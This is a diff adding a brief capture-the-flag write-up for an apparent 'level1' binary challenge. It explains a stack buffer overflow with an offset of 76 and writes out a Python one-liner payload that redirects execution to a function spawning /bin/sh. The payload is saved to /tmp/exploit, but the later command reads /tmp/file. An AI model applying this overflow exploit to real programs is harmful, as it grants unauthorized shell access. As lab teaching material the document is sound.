@@ -1,0 +1,8 @@
+There is a run function that called /bin/sh but the main don't use it.
+The program store our input into a fix buffer. There is no size limitation for our input
+so this is vulnerable to buffer overflow. We can overwrite the eip return address so it will
+point on the run function
+The program segfault at offset 76. Next four caracters will be eip.
+$> python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/exploit
+
+$> cat /tmp/file - | ./level1
